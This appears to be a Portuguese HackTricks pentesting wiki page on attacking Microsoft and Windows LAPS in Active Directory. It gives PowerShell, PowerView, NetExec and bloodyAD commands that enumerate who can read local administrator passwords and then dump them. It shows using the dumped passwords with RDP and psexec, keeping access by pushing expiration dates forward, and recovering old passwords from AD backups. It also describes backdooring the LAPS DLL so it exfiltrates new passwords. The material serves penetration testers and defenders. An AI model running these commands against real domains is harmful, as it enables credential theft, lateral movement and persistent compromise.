# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Informações básicas

Atualmente existem **2 flavors de LAPS** que você pode encontrar durante uma avaliação:

- **Legacy Microsoft LAPS**: armazena a senha do administrador local em **`ms-Mcs-AdmPwd`** e o tempo de expiração em **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (integrado ao Windows desde as atualizações de abril de 2023): ainda pode emular o modo legacy, mas, no modo nativo, usa atributos **`msLAPS-*`**, oferece suporte a **password encryption**, **password history** e **DSRM password backup** para controladores de domínio.

O LAPS foi projetado para gerenciar **senhas de administradores locais**, tornando-as **exclusivas, aleatórias e alteradas com frequência** em computadores ingressados no domínio. Se você conseguir ler esses atributos, normalmente poderá **pivotar como administrador local** para o host afetado. Em muitos ambientes, o ponto interessante não é apenas ler a senha em si, mas também descobrir **quem recebeu acesso delegado** aos atributos de senha.

### Atributos do Legacy Microsoft LAPS

Nos objetos de computador do domínio, a implementação do Legacy Microsoft LAPS resulta na adição de dois atributos:<sup>[[1]](#references)</sup>

- **`ms-Mcs-AdmPwd`**: **senha do administrador em texto simples**
- **`ms-Mcs-AdmPwdExpirationTime`**: **tempo de expiração da senha**

### Atributos do Windows LAPS

O Windows LAPS nativo adiciona vários novos atributos aos objetos de computador:<sup>[[2]](#references)</sup>

- **`msLAPS-Password`**: blob de senha em texto simples armazenado como JSON quando a criptografia não está habilitada
- **`msLAPS-PasswordExpirationTime`**: tempo de expiração agendado
- **`msLAPS-EncryptedPassword`**: senha atual criptografada
- **`msLAPS-EncryptedPasswordHistory`**: histórico de senhas criptografado
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: dados de senha DSRM criptografados para controladores de domínio
- **`msLAPS-CurrentPasswordVersion`**: controle de versão baseado em GUID usado pela lógica mais recente de detecção de rollback (schema de floresta do Windows Server 2025)

Quando **`msLAPS-Password`** pode ser lido, o valor é um objeto JSON contendo o nome da conta, o horário da atualização e a senha em texto simples, por exemplo:<sup>[[2]](#references)</sup>
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Verificar se está ativado
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Acesso à senha do LAPS

Você poderia **baixar a política LAPS bruta** de `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` e, em seguida, usar **`Parse-PolFile`** do pacote [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) para converter esse arquivo em um formato legível.

### Cmdlets do PowerShell do Microsoft LAPS legado

Se o módulo LAPS legado estiver instalado, os seguintes cmdlets geralmente estarão disponíveis:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Cmdlets do PowerShell do Windows LAPS

O Windows LAPS nativo inclui um novo módulo do PowerShell e novos cmdlets:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Alguns detalhes operacionais são importantes aqui:<sup>[[3]](#references)</sup>

- **`Get-LapsADPassword`** lida automaticamente com **legacy LAPS**, **clear-text Windows LAPS** e **encrypted Windows LAPS**.
- Se a password estiver encrypted e você puder **read**, mas não **decrypt**, o cmdlet retorna metadados como **`Source`**, **`DecryptionStatus`** e **`AuthorizedDecryptor`**, mesmo quando não consegue retornar a password em clear-text.
- No **encrypted Windows LAPS**, a **permissão de leitura** e a **permissão de decrypt** são **controles diferentes**. Ter acesso de leitura à OU / ao objeto não significa automaticamente que você pode decrypt **`msLAPS-EncryptedPassword`**.
- O **histórico de passwords** só está disponível quando a **Windows LAPS encryption** está habilitada.
- Em domain controllers, a source retornada pode ser **`EncryptedDSRMPassword`**.

Isso é útil durante um assessment porque o campo **`AuthorizedDecryptor`** informa **para qual user ou group o blob foi encrypted**, muitas vezes transformando uma tentativa malsucedida de read da password em um novo alvo de privilege escalation.

### PowerView / LDAP

O **PowerView** também pode ser usado para descobrir **quem pode read a password e fazer o read**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Se **`msLAPS-Password`** for legível, analise o JSON retornado e extraia **`p`** para obter a senha e **`n`** para obter o nome da conta de administrador local gerenciada.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Esse campo **`n`** é importante em implantações mais recentes porque o **gerenciamento automático de contas do Windows LAPS** pode direcionar uma **conta personalizada** em vez da **`Administrator`** integrada, e sistemas mais recentes **Windows 11 24H2 / Windows Server 2025** podem até **randomizar** o nome dessa conta.<sup>[[4]](#references)</sup>

### Linux / ferramentas remotas

As ferramentas modernas oferecem suporte ao Microsoft LAPS legado e ao Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notas:

- Builds recentes do **NetExec** suportam **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** e **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** ainda é útil para o **Microsoft LAPS** legado a partir do Linux, mas tem como alvo apenas **`ms-Mcs-AdmPwd`**.
- Ferramentas cross-platform mais recentes, como **`LAPS4LINUX`**, ferramentas baseadas em **`dpapi-ng`** e workflows recentes do **NetExec**, também podem lidar com o **Windows LAPS** nativo a partir de hosts não Windows.
- Se o ambiente usar **Windows LAPS** criptografado, uma simples leitura via LDAP não é suficiente; você também precisa ser um **authorized decryptor** (ou possuir material de descriptografia equivalente, como material offline da root key do DPAPI-NG do domínio).<sup>[[5]](#references)</sup>
- No **Windows 11 24H2 / Windows Server 2025**, não presuma que o administrador local gerenciado seja sempre **`Administrator`**. O gerenciamento automático de contas pode criar uma conta personalizada e, opcionalmente, randomizar seu nome; portanto, descubra primeiro o nome da conta via **`n`** / **`Account`** antes de usar **`--laps`** em escala.<sup>[[4]](#references)</sup>

### Abuso da sincronização do diretório

Se você tiver direitos de **directory synchronization** no nível do domínio, em vez de acesso direto de leitura a cada objeto de computador, o LAPS ainda pode ser interessante.

A combinação de **`DS-Replication-Get-Changes`** com **`DS-Replication-Get-Changes-In-Filtered-Set`** ou **`DS-Replication-Get-Changes-All`** pode ser usada para sincronizar atributos **confidential / RODC-filtered**, como o **`ms-Mcs-AdmPwd`** legado. O BloodHound modela isso como **`SyncLAPSPassword`**. Consulte [DCSync](dcsync.md) para obter o contexto sobre replication-rights.

## LAPSToolkit

O [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita a enumeração do LAPS com várias funções.<sup>[[6]](#references)</sup>\
Uma delas é analisar **`ExtendedRights`** para **todos os computadores com o LAPS habilitado.** Isso mostra **grupos** especificamente **delegados para ler senhas do LAPS**, que geralmente são usuários em grupos protegidos.\
Uma **conta** que tenha **ingressado com um computador** em um domínio recebe `All Extended Rights` sobre esse host, e esse direito concede à **conta** a capacidade de **ler senhas**. A enumeração pode mostrar uma conta de usuário que consegue ler a senha do LAPS em um host. Isso pode nos ajudar a **visar usuários específicos do AD** que conseguem ler senhas do LAPS.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumping de Passwords do LAPS com NetExec / CrackMapExec

Se você não tiver um PowerShell interativo, poderá abusar desse privilégio remotamente via LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Isso despeja todos os secrets do LAPS que o usuário pode ler, permitindo que você se mova lateralmente usando uma senha de administrador local diferente.

## Usando a senha do LAPS
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## Persistência do LAPS

### Data de expiração

Uma vez administrador, é possível **obter as senhas** e **impedir** que uma máquina **atualize** sua **senha** ao **definir a data de expiração para o futuro**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
O LAPS nativo do Windows usa **`msLAPS-PasswordExpirationTime`** em vez disso:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> A senha ainda será rotacionada se um **admin** usar **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, ou se **Do not allow password expiration time longer than required by policy** estiver habilitado.

### Ressalva sobre rollback de snapshot em versões mais recentes do Windows LAPS

Truques antigos de rollback de snapshot / imagem são **menos confiáveis** contra deployments recentes do **Windows LAPS**. No **Windows 11 24H2 / Windows Server 2025**, se o schema da forest incluir **`msLAPS-CurrentPasswordVersion`** (**schema da forest do Windows Server 2025**), o cliente compara um GUID armazenado localmente em cache com o valor armazenado no AD e **rotaciona imediatamente a senha** quando um rollback cria um **estado inconsistente**.

Na prática, isso significa que a persistence baseada em snapshots ou as tentativas de ressuscitar uma senha antiga conhecida do admin local podem falhar rapidamente, em vez de sobreviver até a próxima expiração normal.<sup>[[2]](#references)</sup>

Essa proteção se aplica somente ao **Windows LAPS respaldado pelo AD** e ainda depende de a máquina revertida conseguir **autenticar novamente no AD**. Se a máquina não conseguir mais se comunicar com o AD, o **histórico de senhas** ou o **acesso ao backup do AD** ainda poderá salvar a situação.

### Ressalva sobre tampering no gerenciamento automático de contas

Quando o **gerenciamento automático de contas** está habilitado, o Windows LAPS controla o ciclo de vida da conta de admin local gerenciada. Tentativas inesperadas de renomear, reconfigurar ou realizar qualquer outro tampering nessa conta podem ser rejeitadas com **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, portanto a persistence que depende de modificar silenciosamente a conta gerenciada pelo LAPS é menos confiável em endpoints mais recentes.<sup>[[4]](#references)</sup>

### Recuperando senhas históricas de backups do AD

Quando **a criptografia do Windows LAPS + histórico de senhas** está habilitada, backups montados do AD podem se tornar uma fonte adicional de secrets. Se você conseguir acessar um snapshot montado do AD e usar o **recovery mode**, poderá consultar senhas armazenadas anteriormente sem falar com um DC ativo.<sup>[[3]](#references)</sup>
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Isso é principalmente relevante durante **furto de backup do AD**, **abuso de forense offline** ou **acesso à mídia de recuperação de desastres**.

### Backdoor

O código-fonte original do Microsoft LAPS legado pode ser encontrado [aqui](https://github.com/GreyCorbel/admpwd); portanto, é possível inserir um backdoor no código (dentro do método `Get-AdmPwdPassword` em `Main/AdmPwd.PS/Main.cs`, por exemplo) que de alguma forma **exfiltre novas senhas ou as armazene em algum lugar**.

Em seguida, compile o novo `AdmPwd.PS.dll` e faça upload dele para a máquina em `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (e altere o horário de modificação).

## Referências

- [1] [Introdução ao Microsoft LAPS – Local Administrator Password Solution](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [2] [Extensões de schema e direitos do Windows LAPS para o Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [3] [Primeiros passos com o Windows LAPS e o Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [4] [Modos de gerenciamento de contas do Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [5] [LAPS 2.0 Internals - XPN Infosec Blog](https://blog.xpnsec.com/lapsv2-internals/)
- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)

{{#include ../../banners/hacktricks-training.md}}
